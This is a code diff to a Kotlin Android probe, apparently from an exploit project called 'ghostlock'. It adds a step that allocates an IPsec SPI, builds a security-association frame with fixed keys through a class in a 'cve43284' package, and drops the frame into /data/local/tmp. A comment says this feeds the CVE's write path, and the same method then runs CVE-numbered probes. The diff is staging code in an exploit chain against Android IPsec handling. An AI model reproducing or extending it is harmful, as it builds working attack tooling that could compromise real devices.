@@ -89,6 +89,35 @@ object TypedBackendProbe {
             step("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
+        /* 拼一帧会话材料并落盘（43284 的写路径要它）：SPI 用刚申请到的那个，encap 用 4500。 */
+        runCatching {
+            val manager = context.getSystemService(android.net.IpSecManager::class.java)
+            val address = java.net.InetAddress.getByName("127.0.0.1")
+            val allocated = manager!!.allocateSecurityParameterIndex(address)
+            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
+            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
+            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(
+                spi = allocated.spi,
+                encapPort = 4500,
+                senderPort = 0,
+                aesKey = aesKey,
+                hmacKey = hmacKey,
+            )
+            val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
+                "/data/local/tmp/ghostlock-sa.frame",
+                frame,
+            )
+            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(frame)
+                .joinToString("") { byte -> "%02x".format(byte) }
+            step(
+                "typed: sa frame written=" + written + " spi=0x" + Integer.toHexString(allocated.spi) +
+                    " sha256=" + digest.take(16),
+            )
+            allocated.close()
+        }.onFailure { problem ->
+            step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+        }
+
         probe43499(::step)
         probe43284(::step)
         return lines
